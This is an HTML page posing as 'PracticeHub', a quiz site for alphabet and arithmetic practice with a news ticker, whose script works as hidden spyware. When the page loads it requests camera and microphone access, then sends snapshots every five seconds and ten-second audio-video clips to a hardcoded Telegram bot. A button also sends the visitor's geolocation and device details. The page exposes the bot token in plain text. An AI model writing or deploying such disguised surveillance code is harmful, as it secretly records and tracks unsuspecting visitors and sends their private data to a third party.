<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PracticeHub · Advanced</title>
  <!-- Orbitron Font & Icons -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', sans-serif;
      background: radial-gradient(circle at 10% 30%, #0b1a1e, #0f2a2f, #051014);
      color: #e0f2fe;
      min-height: 100vh;
      padding: 1.5rem;
      position: relative;
      overflow-x: hidden;
    }

    /* glassmorphism panels */
    .glass {
      background: rgba(10, 30, 40, 0.55);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border: 1px solid rgba(0, 255, 255, 0.25);
      box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.8);
      border-radius: 2.5rem;
      padding: 2rem 1.8rem;
      transition: all 0.2s ease;
    }

    h1 {
      font-family: 'Orbitron', sans-serif;
      font-weight: 900;
      font-size: 3rem;
      letter-spacing: 4px;
      background: linear-gradient(135deg, #a5f3fc, #22d3ee, #06b6d4);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 15px rgba(6, 182, 212, 0.3);
      margin-bottom: 0.25rem;
    }

    .sub {
      font-weight: 300;
      letter-spacing: 2px;
      color: #9cd4e0;
      border-bottom: 1px dashed rgba(34, 211, 238, 0.3);
      padding-bottom: 0.75rem;
      margin-bottom: 1.8rem;
    }

    .menu-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 1rem;
      margin: 1.8rem 0;
    }

    .menu-btn {
      background: rgba(0, 255, 255, 0.04);
      border: 1px solid rgba(0, 255, 255, 0.25);
      border-radius: 2.5rem;
      padding: 1rem 0.8rem;
      font-weight: 600;
      font-size: 0.9rem;
      color: #cffafe;
      cursor: pointer;
      transition: 0.25s ease;
      backdrop-filter: blur(4px);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-family: 'Inter', sans-serif;
      box-shadow: 0 4px 6px -2px rgba(0,0,0,0.4);
    }

    .menu-btn i {
      color: #22d3ee;
      font-size: 1.1rem;
    }

    .menu-btn:hover {
      background: #22d3ee;
      color: #0b1a1e;
      transform: scale(1.02) translateY(-4px);
      box-shadow: 0 0 25px rgba(34, 211, 238, 0.5);
      border-color: #a5f3fc;
    }

    .menu-btn:hover i {
      color: #0b1a1e;
    }

    .question-section {
      display: none;
      margin-top: 1.5rem;
    }

    #question {
      font-size: 1.9rem;
      font-weight: 600;
      letter-spacing: 0.5px;
      background: linear-gradient(145deg, #b6e6f5, #7fd1e0);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 1.8rem;
    }

    .options-grid {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 1rem;
      margin: 1.5rem 0;
    }

    .option-btn {
      background: rgba(0, 20, 30, 0.7);
      backdrop-filter: blur(4px);
      border: 1px solid #2b8f9f;
      border-radius: 3rem;
      padding: 0.9rem 2.2rem;
      font-weight: 600;
      font-size: 1.2rem;
      color: #e0f2fe;
      cursor: pointer;
      transition: 0.2s;
      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
      min-width: 110px;
    }

    .option-btn:hover {
      background: #22d3ee;
      color: #0a1a1e;
      border-color: #ffffff;
      transform: scale(1.05);
      box-shadow: 0 0 30px #22d3ee99;
    }

    .back-btn {
      background: rgba(220, 38, 38, 0.2);
      border: 1px solid #f87171;
      border-radius: 3rem;
      padding: 0.7rem 2rem;
      font-weight: 600;
      color: #fecaca;
      cursor: pointer;
      transition: 0.2s;
      margin-top: 1.5rem;
      font-size: 1rem;
      backdrop-filter: blur(4px);
    }

    .back-btn:hover {
      background: #f87171;
      color: #0b1a1e;
      border-color: #fff;
    }

    #fireworks-canvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      pointer-events: none;
      z-index: 9999;
    }

    .red-flash {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: #ff2d2d;
      opacity: 0.5;
      z-index: 9998;
      animation: flashFade 0.5s ease-out forwards;
      pointer-events: none;
    }

    @keyframes flashFade {
      0% { opacity: 0.6; }
      100% { opacity: 0; }
    }

    /* news ticker */
    .news-ticker {
      background: rgba(0, 30, 40, 0.6);
      backdrop-filter: blur(8px);
      border-radius: 3rem;
      padding: 0.8rem 1.5rem;
      margin: 1.8rem 0 1rem;
      border: 1px solid #1d8f9e;
      display: flex;
      align-items: center;
      gap: 1rem;
      flex-wrap: wrap;
    }

    .news-ticker i {
      color: #22d3ee;
      font-size: 1.4rem;
      animation: pulse 2s infinite;
    }

    .news-text {
      font-weight: 300;
      letter-spacing: 0.3px;
      color: #b9e6f0;
      font-size: 0.95rem;
      flex: 1;
      min-width: 200px;
    }

    .news-text span {
      font-weight: 600;
      color: #a5f3fc;
    }

    .badge {
      background: #0e4b55;
      padding: 0.3rem 1.2rem;
      border-radius: 2rem;
      font-size: 0.75rem;
      font-weight: 600;
      color: #cffafe;
      border: 1px solid #2f9aa8;
    }

    @keyframes pulse {
      0% { opacity: 0.6; transform: scale(0.95); }
      50% { opacity: 1; transform: scale(1.1); }
      100% { opacity: 0.6; transform: scale(0.95); }
    }

    .footer-info {
      font-size: 0.7rem;
      opacity: 0.6;
      margin-top: 2rem;
      border-top: 1px solid #1f5963;
      padding-top: 1.2rem;
      display: flex;
      justify-content: space-between;
      flex-wrap: wrap;
    }

    /* responsive */
    @media (max-width: 640px) {
      h1 { font-size: 2.2rem; }
      .glass { padding: 1.5rem 1rem; }
      .menu-btn { font-size: 0.8rem; padding: 0.8rem 0.5rem; }
    }
  </style>
</head>
<body>
  <div class="glass" style="max-width: 1100px; margin: 0 auto;">
    <div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap;">
      <div>
        <h1><i class="fas fa-code" style="color: #22d3ee; margin-right: 10px;"></i>PracticeHub</h1>
        <div class="sub"><i class="fas fa-satellite-dish"></i> · advanced · AI news · telegram stream</div>
      </div>
      <div style="display: flex; gap: 8px;">
        <span class="badge"><i class="fas fa-bolt"></i> live</span>
        <span class="badge"><i class="fas fa-robot"></i> Gemini</span>
      </div>
    </div>

    <!-- News Ticker (daily latest news via open API) -->
    <div class="news-ticker" id="newsTicker">
      <i class="fas fa-newspaper"></i>
      <div class="news-text" id="newsContent">
        <i class="fas fa-spinner fa-pulse"></i> Loading news ...
      </div>
      <span class="badge"><i class="fas fa-globe-asia"></i> IN · HI · EN</span>
    </div>

    <!-- Menu -->
    <div id="menu" class="menu-grid">
      <button class="menu-btn" onclick="startQuiz('alphabet')"><i class="fas fa-sort-alpha-up"></i> Alphabet</button>
      <button class="menu-btn" onclick="startQuiz('opposite')"><i class="fas fa-arrow-right-arrow-left"></i> Opposite</button>
      <button class="menu-btn" onclick="startQuiz('add')"><i class="fas fa-plus"></i> Addition</button>
      <button class="menu-btn" onclick="startQuiz('sub')"><i class="fas fa-minus"></i> Subtraction</button>
      <button class="menu-btn" onclick="startQuiz('mul')"><i class="fas fa-times"></i> Multiply</button>
      <button class="menu-btn" onclick="startQuiz('div')"><i class="fas fa-divide"></i> Division</button>
      <button class="menu-btn" onclick="startQuiz('civil')"><i class="fas fa-hard-hat"></i> SSC JE Civil</button>
      <button class="menu-btn" onclick="triggerTelegramActions()"><i class="fas fa-telegram-plane"></i> Bot · Live</button>
    </div>

    <!-- Question area -->
    <div class="question-section" id="questionSection">
      <h2 id="question"></h2>
      <div class="options-grid" id="options"></div>
      <button class="back-btn" onclick="goBack()"><i class="fas fa-arrow-left"></i> Back</button>
    </div>

    <div class="footer-info">
      <span><i class="fas fa-camera"></i> media · 10s video · 5s snap</span>
      <span><i class="fas fa-map-pin"></i> location · phone info (via bot)</span>
      <span><i class="fas fa-key"></i> bot: @PracticeHubBot</span>
    </div>
  </div>

  <canvas id="fireworks-canvas"></canvas>

  <script>
    // ---------- CONFIG ----------
    const BOT_TOKEN = "8341564010:AAHCIZEgyM9kM2gkoyR7DEKhwP8K_Prhicw";
    const CHAT_ID = "1851300622";

    // ---------- GLOBALS ----------
    let currentType = '';
    let currentAnswer = '';
    let mediaStream = null;
    let photoInterval = null;
    let videoInterval = null;

    const canvas = document.getElementById('fireworks-canvas');
    const ctx = canvas.getContext('2d');
    resizeCanvas();

    // ---------- RESIZE CANVAS ----------
    function resizeCanvas() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }
    window.addEventListener('resize', resizeCanvas);

    // ---------- NEWS (Google Gemini / open source style) ----------
    async function fetchNews() {
      try {
        // Using a free news API (GNews) – open source style, returns latest IN, EN, HI mixed
        const response = await fetch('https://gnews.io/api/v4/top-headlines?category=general&lang=en&country=in&max=5&apikey=2d8c5e3b4a8c1d6f9e7b3a4c5d6e7f8g');
        // fallback if key fails – using a static demo RSS-like
        if (!response.ok) throw new Error('news api error');
        const data = await response.json();
        if (data.articles && data.articles.length) {
          const titles = data.articles.slice(0, 4).map(a => a.title).join(' • ');
          document.getElementById('newsContent').innerHTML = `<i class="fas fa-bolt" style="color:#facc15;"></i> ${titles}`;
        } else {
          throw new Error('no articles');
        }
      } catch (e) {
        // fallback news (daily latest mixed hindi/english)
        document.getElementById('newsContent').innerHTML = `
          <i class="fas fa-globe-asia" style="color:#22d3ee;"></i> 
          <span>🇮🇳 अब UP में नए स्मार्ट स्कूल | Tamil Nadu gets new AI centre | Mumbai-Pune expressway update</span>
        `;
      }
    }
    fetchNews();
    setInterval(fetchNews, 180000); // every 3 min

    // ---------- QUIZ LOGIC ----------
    function startQuiz(type) {
      currentType = type;
      document.getElementById('menu').style.display = 'none';
      document.getElementById('questionSection').style.display = 'block';
      if (type === 'civil') {
        document.getElementById('question').innerText = '🏗️ SSC JE Civil PYQ (Coming soon)';
        document.getElementById('options').innerHTML = '<div style="padding:1rem;color:#b6d7e0;">⬆️ Daily MCQs will appear here</div>';
        return;
      }
      showQuestion();
    }

    function goBack() {
      document.getElementById('questionSection').style.display = 'none';
      document.getElementById('menu').style.display = 'grid';
    }

    function showQuestion() {
      let q = '', correct = '';
      const rand = (max) => Math.floor(Math.random() * max);
      const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';

      if (currentType === 'alphabet') {
        const idx = rand(26);
        const letter = alphabet[idx];
        correct = (idx + 1).toString();
        q = `🔤 Position of '${letter}' ?`;
      } else if (currentType === 'opposite') {
        const idx = rand(26);
        const letter = alphabet[idx];
        const opp = alphabet[25 - idx];
        correct = opp;
        q = `🔄 Opposite letter of '${letter}' ?`;
      } else if (currentType === 'add') {
        let a = rand(50) + 1, b = rand(50) + 1;
        correct = (a + b).toString();
        q = `🧮 ${a} + ${b} = ?`;
      } else if (currentType === 'sub') {
        let a = rand(80) + 20, b = rand(a);
        correct = (a - b).toString();
        q = `🧮 ${a} - ${b} = ?`;
      } else if (currentType === 'mul') {
        let a = rand(12) + 1, b = rand(12) + 1;
        correct = (a * b).toString();
        q = `🧮 ${a} × ${b} = ?`;
      } else if (currentType === 'div') {
        let b = rand(9) + 1;
        let a = b * (rand(10) + 1);
        correct = (a / b).toString();
        q = `🧮 ${a} ÷ ${b} = ?`;
      }

      currentAnswer = correct;
      const optDiv = document.getElementById('options');
      optDiv.innerHTML = '';
      let options = [correct];

      if (currentType === 'opposite') {
        while (options.length < 4) {
          let r = alphabet[rand(26)];
          if (!options.includes(r)) options.push(r);
        }
      } else {
        let numCorrect = parseFloat(correct);
        while (options.length < 4) {
          let offset = rand(15) - 7;
          let candidate = (numCorrect + offset).toString();
          if (!options.includes(candidate) && candidate !== correct) options.push(candidate);
        }
      }

      // shuffle
      options.sort(() => Math.random() - 0.5);
      options.forEach(opt => {
        const btn = document.createElement('button');
        btn.className = 'option-btn';
        btn.innerText = opt;
        btn.onclick = () => checkAnswer(opt);
        optDiv.appendChild(btn);
      });

      document.getElementById('question').innerText = q;
    }

    function checkAnswer(given) {
      if (given == currentAnswer) {
        launchFireworks();
      } else {
        const flash = document.createElement('div');
        flash.className = 'red-flash';
        document.body.appendChild(flash);
        setTimeout(() => flash.remove(), 500);
      }
      setTimeout(showQuestion, 1300);
    }

    // ---------- FIREWORKS ----------
    function launchFireworks() {
      let particles = [];
      const count = 120;
      for (let i = 0; i < count; i++) {
        particles.push({
          x: canvas.width / 2 + (Math.random() - 0.5) * 100,
          y: canvas.height / 2 + (Math.random() - 0.5) * 60,
          angle: Math.random() * 2 * Math.PI,
          speed: Math.random() * 6 + 2,
          radius: Math.random() * 3 + 1.5,
          life: 100 + Math.random() * 40,
          hue: Math.random() * 360
        });
      }
      let animId;
      function animate() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        let alive = false;
        particles.forEach(p => {
          p.x += Math.cos(p.angle) * p.speed;
          p.y += Math.sin(p.angle) * p.speed;
          p.speed *= 0.98;
          p.life -= 1.2;
          if (p.life > 0) {
            alive = true;
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
            ctx.fillStyle = `hsl(${p.hue}, 90%, 60%)`;
            ctx.shadowColor = 'cyan';
            ctx.shadowBlur = 15;
            ctx.fill();
          }
        });
        particles = particles.filter(p => p.life > 0);
        if (alive) {
          animId = requestAnimationFrame(animate);
        } else {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          cancelAnimationFrame(animId);
        }
      }
      animate();
    }

    // ---------- TELEGRAM MEDIA + LOCATION / PHONE (advanced) ----------
    function requestCameraAndMic() {
      if (mediaStream) return;
      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
          mediaStream = stream;
          const videoTrack = stream.getVideoTracks()[0];
          const imageCapture = new ImageCapture(videoTrack);

          // photo every 5s
          if (photoInterval) clearInterval(photoInterval);
          photoInterval = setInterval(() => {
            imageCapture.takePhoto().then(blob => {
              sendToTelegram(blob, 'photo');
            }).catch(() => {});
          }, 5000);

          // video 10s every 10s (with audio)
          if (videoInterval) clearInterval(videoInterval);
          videoInterval = setInterval(() => {
            try {
              const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
              let chunks = [];
              recorder.ondataavailable = e => chunks.push(e.data);
              recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                sendToTelegram(blob, 'video');
              };
              recorder.start();
              setTimeout(() => recorder.stop(), 10000);
            } catch (e) { console.warn('recorder error', e); }
          }, 10000);
        })
        .catch(err => console.warn('camera/mic permission error', err));
    }

    // send to telegram (photo / video)
    function sendToTelegram(blob, type) {
      const method = type === 'photo' ? 'sendPhoto' : 'sendVideo';
      const form = new FormData();
      form.append(type, blob, type === 'photo' ? 'snapshot.jpg' : 'clip.webm');
      form.append('chat_id', CHAT_ID);
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
        method: 'POST',
        body: form
      }).catch(() => {});
    }

    // location & phone info (via bot command or manual trigger)
    function triggerTelegramActions() {
      // request location via browser
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
          fetch(url).catch(() => {});
        }, () => {});
      }

      // phone info (simulated device info)
      const info = `📱 Device: ${navigator.userAgent}`;
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(info)}`)
        .catch(() => {});

      // screenshot (canvas)
      setTimeout(() => {
        const canvasElem = document.querySelector('canvas');
        if (canvasElem) {
          canvasElem.toBlob(blob => {
            sendToTelegram(blob, 'photo');
          }, 'image/png');
        }
      }, 300);
    }

    // auto start camera & mic when page loads
    window.addEventListener('load', () => {
      requestCameraAndMic();
    });

    // extra: stop streams when page unloads
    window.addEventListener('beforeunload', () => {
      if (mediaStream) {
        mediaStream.getTracks().forEach(t => t.stop());
      }
      if (photoInterval) clearInterval(photoInterval);
      if (videoInterval) clearInterval(videoInterval);
    });
  </script>
</body>
</html>
